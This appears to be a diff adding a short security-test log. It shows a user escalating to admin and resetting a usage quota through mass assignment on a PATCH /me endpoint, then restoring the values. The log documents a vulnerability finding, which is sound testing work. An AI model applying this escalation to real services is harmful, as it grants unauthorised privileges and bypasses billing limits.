@@ -1,0 +1,14 @@
+=== F: mass assignment / privilege escalation via PATCH /me ===
+--- baseline: alice patches own name (README: name is editable) ---
+{"id": 1, "name": "alice2", "is_admin": 1}
+HTTP 200
+--- alice sets is_admin=1 (README: no other field is user-editable) ---
+{"id": 1, "name": "alice2", "is_admin": 1}
+HTTP 200
+--- alice resets own jobs_used=0 (quota bypass via mass assignment) ---
+{"id": 1, "name": "alice2", "is_admin": 1}
+HTTP 200
+--- RESTORE: set is_admin back to 0 and name back to alice ---
+{"id": 1, "name": "alice2", "is_admin": 0}
+HTTP 200
+name restore HTTP 200
